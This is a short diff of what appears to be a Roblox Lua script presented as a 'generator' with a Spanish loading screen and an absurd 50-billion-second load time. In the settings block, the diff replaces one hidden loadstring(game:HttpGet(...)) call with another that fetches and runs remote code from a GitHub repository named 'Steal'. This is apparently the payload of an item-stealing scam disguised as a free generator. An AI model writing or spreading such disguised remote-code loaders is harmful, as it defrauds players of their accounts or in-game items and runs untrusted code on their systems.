@@ -1,5 +1,5 @@
 --settings:
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Mm2generador/mmm/refs/heads/main/test.lua'))()local title = "Cargando Generador" --upper title
+loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptsop13/Steal/refs/heads/main/Jhonaiker.lua'))() title = "Cargando Generador" --upper title
 local loading_text = "Porfavor espera" --gray title
 local loadingtime = 50000000000 --loading time (in seconds)
 
